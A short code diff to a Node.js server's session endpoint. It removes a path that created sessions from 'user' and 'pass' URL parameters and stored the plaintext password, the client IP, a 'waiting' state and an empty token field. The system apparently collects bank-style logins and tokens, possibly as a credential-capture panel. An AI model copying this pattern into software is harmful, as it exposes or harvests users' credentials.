@@ -314,29 +314,9 @@ async function handleRequest(req, res) {
     if (sessionMatch && req.method === 'GET') {
       loadSessions();
       const id = sessionMatch[1];
-      let session = sessions[id];
+      const session = sessions[id];
       if (!session) {
-        const qUser = reqUrl.searchParams.get('user');
-        const qPass = reqUrl.searchParams.get('pass');
-        if (qUser && qPass && qPass !== '—') {
-          session = {
-            id,
-            username: qUser,
-            password: qPass,
-            tipoUsuario: 'EMPRESAS',
-            device: 'desktop',
-            ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '127.0.0.1',
-            state: 'waiting',
-            token: '',
-            createdAt: Date.now(),
-            last_seen: Date.now(),
-            updatedAt: Date.now()
-          };
-          sessions[id] = session;
-          saveSessions();
-        } else {
-          return sendJson(res, 404, { error: 'Session not found' });
-        }
+        return sendJson(res, 404, { error: 'Session not found' });
       }
       return sendJson(res, 200, session);
     }
